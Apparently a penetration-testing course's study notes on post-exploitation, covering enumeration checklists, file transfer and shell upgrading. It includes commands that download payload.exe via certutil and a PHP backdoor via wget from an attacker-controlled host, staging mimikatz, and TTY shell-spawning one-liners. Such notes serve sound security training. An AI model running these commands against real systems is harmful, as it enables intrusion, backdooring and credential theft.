# Post Exploitation

## [Post-Exploitation](http://www.pentest-standard.org/index.php/Post\_Exploitation) Introduction <a href="#post-exploitation-introduction" id="post-exploitation-introduction"></a>

üóíÔ∏è **Post-Exploitation** is the final phase of interaction with a target during a pentest. Using various attacking techniques, the pentester determines the value of the compromised system and keeps control of it for future usage, depending on the kind of access and the stealthiness he must have.

It is _what the pentester does after the initial foothold_ and the techniques depends on the target characteristics (operating system, infrastructure).

* The techniques must follow the _**Rules of Engagement**_ agreed upon with the client **before the penetration test**, based on the company infrastructure and services.

> ‚ùó**Necessary permissions are required to conduct post-exploitation techniques like modifying services, system configuration, logs deletion, perform privilege escalation.**

### Methodology <a href="#methodology" id="methodology"></a>

1. Local Enumeration

> * Enumerating System Information
> * Enumerating Users And Groups
> * Enumerating Network Information
> * Enumerating Services
> * Automating Local Enumeration

2. Transferring Files

> * Setting Up A Web Server With Python
> * Transferring Files To Windows Targets
> * Transferring Files To Linux Targets

3. Upgrading Shells

> * Upgrading Command Shells To Meterpreter
> * Spawning TTY Shells

4. Privilege Escalation

> * Identifying PrivEsc Vulns
> * Windows PrivEsc
> * Linux PrivEsc

5. Persistence

> * Setting Up Persistence On Windows
> * Setting Up Persistence On Linux

6. Dumping & Cracking Hashes

> * Dumping & Cracking Windows Hashes
> * Dumping & Cracking Linux Hashes

7. Pivoting

> * Internal Network Recon
> * Pivoting

8. Clearing Tracks

> * Clearing your Tracks On Windows & Linux

_The post-exploitation process repeats itself after pivoting to another new target._

> üî¨ The following techniques are covered in the
>
> * [ü™ü Windows Post-Exploitation Labs](windows-post-exploitation.md)
> * [üêß Linux Post-Exploitation Labs](https://app.gitbook.com/o/erINDgTXVh2ylWBxpoDg/s/OVa8OVKg2HE0a3ygHQE9/\~/changes/49/courses/ejptv2-notes/host-and-networking-penetration-testing/post-exploitation/linux-post-exploitation)

***

## Windows Local Enumeration <a href="#windows-local-enumeration" id="windows-local-enumeration"></a>

> üìùüìå [Checklist - Local Windows Privilege Escalation | HackTricks](https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation)
>
> [üî¨ Windows Post-Exploitation Lab](windows-post-exploitation.md)

### System Information <a href="#system-information" id="system-information"></a>

_What is running on the target system?_

* Hostname
* OS Name, Build, Service Pack, Architecture
* Installed updates/Hotfixes

### Users & Groups <a href="#users-and-groups" id="users-and-groups"></a>

* Current user, privileges & additional user information
* Other users
* Groups
* Members of the built-in administrators group

### Network information & Services <a href="#network-information-and-services" id="network-information-and-services"></a>

* IP address & network adapter
* Internal networks and other hosts on the network
* TCP/UDP services + ports
* Routing table
* Windows Firewall state
* Running processes & services
* Scheduled tasks

A **process** is an istance of a running program.

A **service** is a process that runs in the background.

### Automating Local Enumeration <a href="#automating-local-enumeration" id="automating-local-enumeration"></a>

The Local Enumeration process can be automated with the help of scripts and Metasploit Framework modules.

* Be time efficient
* Additional enumeration & exploitation information

#### **Tools**:

* [JAWS - Just Another Windows (Enum) Script](https://github.com/411Hall/JAWS)
* [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

***

## Linux Local Enumeration <a href="#linux-local-enumeration" id="linux-local-enumeration"></a>

> üìùüìå [Checklist - Linux Privilege Escalation | HackTricks](https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist)
>
> [üî¨ Linux Post-Exploitation Lab](https://app.gitbook.com/o/erINDgTXVh2ylWBxpoDg/s/OVa8OVKg2HE0a3ygHQE9/\~/changes/49/courses/ejptv2-notes/host-and-networking-penetration-testing/post-exploitation/linux-post-exploitation)

### System Information <a href="#system-information-1" id="system-information-1"></a>

* Hostname
* Distribution & release version
* Kernel version & Architecture
* CPU information
* Disk & mounted drives
* Installed packages

### Users & Groups <a href="#users-and-groups-1" id="users-and-groups-1"></a>

* Current user & privileges
* Other users
* Groups

### Network information & Services <a href="#network-information-and-services-1" id="network-information-and-services-1"></a>

* IP address & network adapter
* Internal networks and other hosts on the network
* TCP/UDP services + ports
* Running services
* Scheduled Cron Jobs

### Automating Local Enumeration <a href="#automating-local-enumeration-1" id="automating-local-enumeration-1"></a>

The Local Enumeration process can be automated with the help of scripts and Metasploit Framework modules. It is very useful to be time efficient.

**Tools**:

* [LinEnum - rebootuser](https://github.com/rebootuser/LinEnum)
* [linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

***

## Transferring Files <a href="#transferring-files" id="transferring-files"></a>

### [Python Web Server](https://developer.mozilla.org/en-US/docs/Learn/Common\_questions/Tools\_and\_setup/set\_up\_a\_local\_testing\_server) <a href="#python-web-server" id="python-web-server"></a>

**`Python`** modules can be useful for setting up a web server that hosts the files required for transfer. These modules

* Check `Python` version

```bash
python -V
python3 -V
py -v # on Windows
```

* [**`SimpleHTTPServer`**](https://docs.python.org/2.7/library/simplehttpserver.html#module-SimpleHTTPServer) - `python2` module

```bash
# If Python version returned is 2.X
python -m SimpleHTTPServer <PORT_NUMBER>
```

* [**`http.server`**](https://docs.python.org/3/library/http.server.html) - `python3` module

```bash
# If Python version is 3.X
python3 -m http.server <PORT>
```

```bash
# On Windows, try 
python -m http.server <PORT>
py -3 -m http.server <PORT>
```

**`e.g.`**

* Copy a file into the current directory and setup the web server to download the file into the target system

```bash
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .

# Python 2.7
python -m SimpleHTTPServer 80

# Python 3.7
python3 -m http.server 80
```

<figure><img src="../../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

* Files can be downloaded from a browser or using a `GET` request

<figure><img src="../../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

#### **Windows**

* Set up a web server to host the `payload.exe` file

```bash
# Attacker machine
cd /root/Desktop/ # payload.exe must be here
python3 -m http.server 80
```

<figure><img src="../../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

* After gaining access to the Windows target system and spawned a command shell session, download the payload file on the target system using the `certutil` tool in `cmd`.
  * Make sure to create `Temp` if no such directory exist.

```bash
# Windows Target machine
cd C:\Temp
certutil -urlcache -f http://<ATTACKER-IP>/payload.exe payload.exe
```

<figure><img src="../../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

#### **Linux**

* After exploiting the Linux target, transfer the `php-backdoor.php` file to the target.
* 2 terminal sessions are necessary - use `tmux` utility to get more sessions.

[**`tmux`**](https://github.com/tmux/tmux/wiki) - _is a program, **terminal multiplexer**, which runs in a terminal and allows multiple other terminal programs to be run inside it_

```bash
sudo apt install tmux -y
```

```bash
# Attacker machine
tmux
# ... Exploitation with MSFconsole in Terminal 0 ...
# CTRL+B and then C to open a new terminal session

cd /usr/share/webshells/php/
ip -br -c a
	192.118.214.2
python3 -m http.server 80
```

<figure><img src="../../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

```bash
# CTRL+B then 0 (zero) to navigate to the first Terminal session
# Target machine
/bin/bash -i
wget http://192.219.50.2/php-backdoor.php
```

<figure><img src="../../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

***

## Interactive Shells <a href="#interactive-shells" id="interactive-shells"></a>

> üî¨ Interactive shells techniques are covered in an INE vulnerable Lab. Commands are below, assuming the target SAMBA service is already exploited through the `exploit/linux/samba/is_known_pipename` MSF module.

* After the exploitation (using `MSFconsole`, `netcat`, etc), a **non-interactive shell** is obtained since it doesn't provide with a prompt
  * This is a command shell session

<figure><img src="../../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

* Display the list of **shells** on the target system

```bash
cat /etc/shells
    # /etc/shells: valid login shells
    /bin/sh
    /bin/dash
    /bin/bash
    /bin/rbash

/bin/bash -i

/bin/sh -i
```

<figure><img src="../../../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

### Spawn [TTY Shells](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys#spawn-shells) <a href="#spawn-tty-shells" id="spawn-tty-shells"></a>

#### **Bash**

* Upgrade to a simple **`bash`** or **`sh`** session (assuming `bash` is installed on the target system)

```bash
/bin/bash -i
/bin/sh -i
SHELL=/bin/bash script -q /dev/null

# Setup environment variables
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export TERM=xterm
export SHELL=/bin/bash
```

<figure><img src="../../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

#### [**Python**](https://docs.python.org/3/library/pty.html)

* From the non-interactive shell session, check `Python` version (if present)

```bash
python --version
	Python 2.7.9
```

* Spawn a **`bash`** session with `Python`. Specified shell must be listed inside `/etc/shells`

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

**Fully Interactive TTY**

* Background (`CTRL+Z`) the current remote shell
* Update the local terminal line settings with [`stty`](https://man7.org/linux/man-pages/man1/stty.1.html) and bring the remote shell back with `fg`

```bash
stty raw -echo && fg
```

* Reinitialize the terminal with `reset`

```bash
reset
```

> üìå For more information on **Full TTY Shells** check
>
> * [Full TTY Shells - HackTricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys)
> * [Upgrade to Fully Interactive TTYs - 0xffsec](https://0xffsec.com/handbook/shells/full-tty/)

**Perl**

```bash
perl -h
```

* Spawn a **`bash`** session with `Perl`.

```bash
perl -e 'exec "/bin/bash";'
```

***





